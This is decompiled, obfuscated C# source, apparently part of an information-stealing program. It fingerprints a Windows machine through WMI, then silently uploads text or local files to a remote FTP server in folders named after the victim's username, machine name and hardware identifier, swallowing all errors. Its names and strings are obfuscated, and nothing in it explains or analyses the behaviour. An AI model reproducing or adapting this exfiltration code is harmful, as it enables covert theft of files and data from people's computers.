using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bpbWYHKNCNX;

internal sealed class WvzKEuHaCmnRFN
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string ZFtKFOgpGbKvcG()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107406236));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107406215)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107406166);
			ManagementObject val3 = new ManagementObject(getString_0(107406161) + text2 + getString_0(107406152));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107406147)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107393545) : text;
		}
	}

	public static void aSHjrEaEPzQjE(string efPZNUAyOkjqPqs = "URL", string qfbmCTXAQfYb = "USERNAME", string CWbkSHYCwkj = "ACCESO", string MQNYdygTxBbaD = "")
	{
		try
		{
			string text = ZFtKFOgpGbKvcG();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(efPZNUAyOkjqPqs + getString_0(107407827) + Environment.UserName + getString_0(107407846) + Environment.MachineName + getString_0(107407281) + text + getString_0(107407276));
			ftpWebRequest.Method = getString_0(107406090);
			ftpWebRequest.Credentials = new NetworkCredential(qfbmCTXAQfYb, CWbkSHYCwkj);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(MQNYdygTxBbaD);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void TuLLWzXJhisVm(string sEJfMJScWZ = "URL", string ICYdZKKbkDybdal = "USERNAME", string UCGaCZVGHyn = "ACCESO", string VZoQGgpejkTSmW = "")
	{
		try
		{
			string text = ZFtKFOgpGbKvcG();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(sEJfMJScWZ + getString_0(107407827) + Environment.UserName + getString_0(107407846) + Environment.MachineName + getString_0(107407281) + text + getString_0(107407281) + Path.GetFileName(VZoQGgpejkTSmW));
			ftpWebRequest.Method = getString_0(107406090);
			ftpWebRequest.Credentials = new NetworkCredential(ICYdZKKbkDybdal, UCGaCZVGHyn);
			byte[] array = File.ReadAllBytes(VZoQGgpejkTSmW);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static WvzKEuHaCmnRFN()
	{
		Strings.CreateGetStringDelegate(typeof(WvzKEuHaCmnRFN));
	}
}
